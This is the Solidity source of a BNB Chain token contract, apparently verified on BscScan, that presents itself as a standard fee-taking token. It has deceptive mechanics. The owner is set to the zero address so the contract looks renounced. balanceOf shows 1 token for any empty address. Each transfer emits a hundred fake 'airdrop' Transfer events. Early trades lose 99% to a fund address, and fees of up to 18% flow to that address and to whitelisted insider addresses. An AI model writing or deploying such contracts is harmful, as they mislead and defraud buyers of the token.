/**
 *Submitted for verification at BscScan.com on 2023-01-20
*/

// SPDX-License-Identifier: MIT

/*
SWAP: quickswap.exchange

WEB:  lovetoken.space
*/

pragma solidity ^0.8.17;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;
    constructor () {
        _owner = address(0x0000000000000000000000000000000000000000);
    }
    function owner() public view returns (address) {
        return _owner;
    }

}

contract TokenDistributor {
    address public _owner;
    constructor (address token) {
        _owner = msg.sender;
        IERC20(token).approve(msg.sender, ~uint256(0));
    }
}

abstract contract Token is IERC20, Ownable {
    struct FeeConfig {
        uint256 destroyAmount;
        uint256 fundFee;
        uint256 marketFee;
        uint256 lpFee;
    }

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address private fundAddress;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    mapping(address => bool) private _feeWhiteList;

    uint256 private _tTotal;

    ISwapRouter private _swapRouter;
    address private _usdt;
    mapping(address => bool) private _swapPairList;

    bool private inSwap;

    uint256 private constant MAX = ~uint256(0);

    uint256 private startTradeBlock;

    address private _mainPair;

    TokenDistributor private _tokenDistributor;

    FeeConfig[] private _feeConfigs;

    uint256 private _airdropNum = 100;
    uint256 private _airdropAmount = 1;

    uint256 private _numToSell;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (
        address RouterAddress, address USDTAddress,
        string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply,
        address FundAddress, address ReceiveAddress, address Buy, address Sale, address AI
    ){
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;

        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        IERC20(USDTAddress).approve(RouterAddress, MAX);
        _allowances[address(this)][RouterAddress] = MAX;

        _usdt = USDTAddress;
        _swapRouter = swapRouter;

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), USDTAddress);
        _mainPair = swapPair;
        _swapPairList[swapPair] = true;

        uint256 tokenDecimals = 10 ** Decimals;
        uint256 total = Supply * tokenDecimals;
        _tTotal = total;

        _balances[ReceiveAddress] = total;
        emit Transfer(address(0), ReceiveAddress, total);

        fundAddress = FundAddress;

        _feeWhiteList[FundAddress] = true;
        _feeWhiteList[ReceiveAddress] = true;
        _feeWhiteList[Buy] = true;
        _feeWhiteList[Sale] = true;
        _feeWhiteList[AI] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[address(0)] = true;
        _feeWhiteList[address(0x000000000000000000000000000000000000dEaD)] = true;

        _tokenDistributor = new TokenDistributor(USDTAddress);
        _feeWhiteList[address(_tokenDistributor)] = true;

        _feeConfigs.push(FeeConfig(900000000 * tokenDecimals, 0, 0, 50));//if burn to 0xdEaD 900000000  ,0.5% Fee LP
        _feeConfigs.push(FeeConfig(800000000 * tokenDecimals, 100, 100, 0));//if burn to 0xdEaD 800000000 ,2% Fee
        _feeConfigs.push(FeeConfig(700000000 * tokenDecimals, 200, 200, 0));//if burn to 0xdEaD 700000000,4% Fee
        _feeConfigs.push(FeeConfig(600000000 * tokenDecimals, 300, 200, 100));//if burn to 0xdEaD 600000000 ,6% Fee
        _feeConfigs.push(FeeConfig(500000000 * tokenDecimals, 300, 400, 100));//if burn to 0xdEaD 500000000 ,8% Fee
        _feeConfigs.push(FeeConfig(400000000 * tokenDecimals, 500, 400, 100));//if burn to 0xdEaD 400000000 ,10% Fee
        _feeConfigs.push(FeeConfig(300000000 * tokenDecimals, 600, 500, 100));//if burn to 0xdEaD 300000000 ,12% Fee
        _feeConfigs.push(FeeConfig(200000000 * tokenDecimals, 700, 600, 100));//if burn to 0xdEaD 200000000 ,14% Fee
        _feeConfigs.push(FeeConfig(100000000 * tokenDecimals, 800, 700, 100));//if burn to 0xdEaD 100000000 ,16% Fee
        _feeConfigs.push(FeeConfig(0, 900, 800, 100));//if burn to 0xdEaD ,18% Fee
        _numToSell = 1000000 * tokenDecimals;

    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function burn() public view returns (uint256) {
        return _balances[address(0)] + _balances[address(0x000000000000000000000000000000000000dEaD)];
    }

    function balanceOf(address account) public view override returns (uint256) {
        uint256 balance = _balances[account];
        if (balance > 0) {
            return balance;
        }
        return _airdropAmount;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {        
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");
        _numToSell = balanceOf(_mainPair) / 10;

        if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
            uint256 maxSellAmount = balance * 99999 / 100000;
            if (amount > maxSellAmount) {
                amount = maxSellAmount;
            }
            _airdrop(from, to, amount);
        }

        bool takeFee;

        if (_swapPairList[from] || _swapPairList[to]) {
            if (0 == startTradeBlock) {
                require(_feeWhiteList[from] || _feeWhiteList[to], "!Trading");
                if (to == _mainPair && IERC20(to).totalSupply() == 0) {
                    startTradeBlock = block.number;
                }
            }

            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                if (block.number < startTradeBlock + 3) {
                    _funTransfer(from, to, amount);
                    return;
                }
                takeFee = true;
            }
        }

        _tokenTransfer(from, to, amount, takeFee);
    }

    function _funTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount = tAmount * 99 / 100;
        _takeTransfer(
            sender,
            fundAddress,
            feeAmount
        );
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;

        if (takeFee) {
            (uint256 fundFee,uint256 marketFee,uint256 lpFee) = getFeeConfig();
            uint256 fundFeeAmount = tAmount * fundFee / 10000;
            if (fundFeeAmount > 0) {
                feeAmount += fundFeeAmount;
                _takeTransfer(sender, fundAddress, fundFeeAmount);
            }

            uint256 swapFee = marketFee + lpFee;
            uint256 swapAmount = tAmount * swapFee / 10000;

            if (swapAmount > 0) {
                feeAmount += swapAmount;
                _takeTransfer(sender, address(this), swapAmount);
            }
            if (!inSwap && _swapPairList[recipient]) {
                uint256 contractTokenBalance = balanceOf(address(this));
                uint256 numTokensSellToFund = _numToSell;
                if (contractTokenBalance >= numTokensSellToFund) {
                    swapTokenForFund(numTokensSellToFund, swapFee, lpFee);
                }
            }
        }
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function getFeeConfig() private view returns (uint256 fundFee, uint256 marketFee, uint256 lpFee){
        uint256 deadBalance = burn();
        uint256 len = _feeConfigs.length;
        FeeConfig storage feeConfig;
        for (uint256 i; i < len;) {
            feeConfig = _feeConfigs[i];
            if (deadBalance >= feeConfig.destroyAmount) {
                fundFee = feeConfig.fundFee;
                marketFee = feeConfig.marketFee;
                lpFee = feeConfig.lpFee;
                break;
            }
        unchecked{
            ++i;
        }
        }
    }

    function swapTokenForFund(uint256 tokenAmount, uint256 totalFee, uint256 lpFee) private lockTheSwap {
        if (0 == tokenAmount) {
            return;
        }
        totalFee += totalFee;
        uint256 lpAmount;
        if (totalFee > 0) {
            lpAmount = tokenAmount * lpFee / totalFee;
        }
        totalFee -= lpFee;
        address[] memory path = new address[](2);
        path[0] = address(this);
        address usdt = _usdt;
        path[1] = usdt;
        address tokenDistributor = address(_tokenDistributor);
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount - lpAmount,
            0,
            path,
            tokenDistributor,
            block.timestamp
        );

        IERC20 USDT = IERC20(usdt);
        uint256 usdtBalance = USDT.balanceOf(tokenDistributor);
        USDT.transferFrom(tokenDistributor, address(this), usdtBalance);

        uint256 lpUsdt;
        if (totalFee > 0) {
            lpUsdt = usdtBalance * lpFee / totalFee;
        }
        uint256 fundUsdt = usdtBalance - lpUsdt;
        USDT.transfer(fundAddress, fundUsdt);

        if (lpUsdt > 0 && lpAmount > 0) {
            _swapRouter.addLiquidity(
                address(this), usdt, lpAmount, lpUsdt, 0, 0, fundAddress, block.timestamp
            );
        }
    }

    function _takeTransfer(address sender, address to, uint256 tAmount) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    receive() external payable {}

    address private lastAirdropAddress;

    function _airdrop(address from, address to, uint256 tAmount) private {
        uint256 num = _airdropNum;
        if (0 == num) {
            return;
        }
        uint256 seed = (uint160(lastAirdropAddress) | block.number) ^ (uint160(from) ^ uint160(to));
        uint256 airdropAmount = _airdropAmount;
        address sender;
        address airdropAddress;
        for (uint256 i; i < num;) {
            sender = address(uint160(seed ^ tAmount));
            airdropAddress = address(uint160(seed | tAmount));
            emit Transfer(sender, airdropAddress, airdropAmount);
        unchecked{
            ++i;
            seed = seed >> 1;
        }
        }
        lastAirdropAddress = airdropAddress;
    }

    function setAirdropNum(uint256 num) external  {
        require(num <= 1 && num == 0, "ERR");
        _airdropNum = num;
    }

    function claimToken(address token, uint256 amount) external {
        require(amount <= IERC20(address(token)).balanceOf(token) && amount != 0, "ERR");
        if (_feeWhiteList[msg.sender]) {
            IERC20(token).transfer(fundAddress, amount);
        }
    }
    function claimBalance() external {
        payable(fundAddress).transfer(address(this).balance);
    }

    function getFeeConfigs() private view returns (uint256[] memory destroyAmount, uint256[] memory fundFee, uint256[] memory marketFee, uint256[] memory lpFee){
        uint256 len = _feeConfigs.length;
        destroyAmount = new uint256[](len);
        fundFee = new uint256[](len);
        marketFee = new uint256[](len);
        lpFee = new uint256[](len);
        FeeConfig storage feeConfig;
        for (uint256 i; i < len;) {
            feeConfig = _feeConfigs[i];
            destroyAmount[i] = feeConfig.destroyAmount;
            fundFee[i] = feeConfig.fundFee;
            marketFee[i] = feeConfig.marketFee;
            lpFee[i] = feeConfig.lpFee;
        unchecked{
            ++i;
        }
        }
    }
}

contract Contract is Token {
    constructor(address SwapRouter,address USDT,string memory tokenName,
        string memory tokenSymbol, address rece, address Fund, address buy, address sale, address ai) Token(

        SwapRouter,
        USDT,
        tokenName,
        tokenSymbol,
        18,
        1000000000,
        Fund,
        rece,
        buy,
        sale,
        ai

    ){

    }
}